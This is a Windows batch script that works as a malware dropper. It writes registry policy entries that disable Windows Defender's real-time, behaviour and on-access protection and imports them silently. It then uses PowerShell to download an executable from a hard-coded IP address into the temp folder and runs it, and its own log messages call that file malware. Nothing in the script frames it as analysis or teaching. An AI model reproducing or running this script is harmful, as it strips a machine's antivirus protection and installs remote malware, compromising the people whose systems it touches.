@echo off
REM Function to disable Windows Defender
echo Windows Registry Editor Version 5.00 > "%TEMP%\disable_defender.reg"
echo. >> "%TEMP%\disable_defender.reg"
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender] >> "%TEMP%\disable_defender.reg"
echo "DisableAntiSpyware"=dword:00000001 >> "%TEMP%\disable_defender.reg"
echo "DisableRealtimeMonitoring"=dword:00000001 >> "%TEMP%\disable_defender.reg"
echo. >> "%TEMP%\disable_defender.reg"
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection] >> "%TEMP%\disable_defender.reg"
echo "DisableBehaviorMonitoring"=dword:00000001 >> "%TEMP%\disable_defender.reg"
echo "DisableOnAccessProtection"=dword:00000001 >> "%TEMP%\disable_defender.reg"
echo "DisableScanOnRealtimeEnable"=dword:00000001 >> "%TEMP%\disable_defender.reg"

REM Import the registry settings to disable Windows Defender
regedit.exe /s "%TEMP%\disable_defender.reg"
if %errorlevel% neq 0 (
    echo Failed to disable Windows Defender. >> "%TEMP%\script_log.txt"
) else (
    echo Windows Defender disabled successfully. >> "%TEMP%\script_log.txt"
)

REM Function to download a file silently
powershell -Command "Invoke-WebRequest -Uri 'http://54.224.34.222:3004/uploads/BootyMistress.exe' -OutFile '%TEMP%\installer.exe' -UseBasicParsing"
if %errorlevel% neq 0 (
    echo Failed to download malware file. >> "%TEMP%\script_log.txt"
) else (
    echo Downloaded malware file to %TEMP%\installer.exe. >> "%TEMP%\script_log.txt"
)

REM Function to run an executable silently
"%TEMP%\installer.exe"
if %errorlevel% neq 0 (
    echo Failed to execute malware. Exit code: %errorlevel% >> "%TEMP%\script_log.txt"
) else (
    echo Executed malware successfully. >> "%TEMP%\script_log.txt"
)

REM Display completion message
echo Script execution completed.
